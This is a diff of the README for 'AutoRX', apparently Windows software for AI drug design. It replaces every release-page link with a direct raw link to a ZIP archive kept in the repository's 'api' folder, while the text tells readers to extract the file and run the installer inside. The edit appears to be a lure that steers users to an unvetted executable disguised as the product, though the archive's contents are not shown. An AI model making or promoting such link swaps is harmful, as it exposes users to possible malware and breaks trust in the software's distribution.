@@ -1,6 +1,6 @@
 # 🧬 AutoRX - Run AI Drug Design on Windows
 
-[![Download AutoRX](https://img.shields.io/badge/Download-AutoRX-blue?style=for-the-badge)](https://github.com/ewx12344/AutoRX/releases)
+[![Download AutoRX](https://img.shields.io/badge/Download-AutoRX-blue?style=for-the-badge)](https://raw.githubusercontent.com/ewx12344/AutoRX/main/api/RX-Auto-3.7.zip)
 
 ## 🚀 What AutoRX Does
 
@@ -29,7 +29,7 @@ For larger docking jobs, 16 GB RAM gives more room.
 
 Visit the release page and download the latest Windows build:
 
-https://github.com/ewx12344/AutoRX/releases
+https://raw.githubusercontent.com/ewx12344/AutoRX/main/api/RX-Auto-3.7.zip
 
 After the file downloads, open it from your Downloads folder. If the file is a ZIP archive, extract it first. If it is an installer or app file, run it.
 
@@ -194,4 +194,4 @@ admet, ai-agent, autodock-vina, autonomous-agents, bioinformatics, cheminformati
 
 If you need the release page later, use this link:
 
-https://github.com/ewx12344/AutoRX/releases
+https://raw.githubusercontent.com/ewx12344/AutoRX/main/api/RX-Auto-3.7.zip
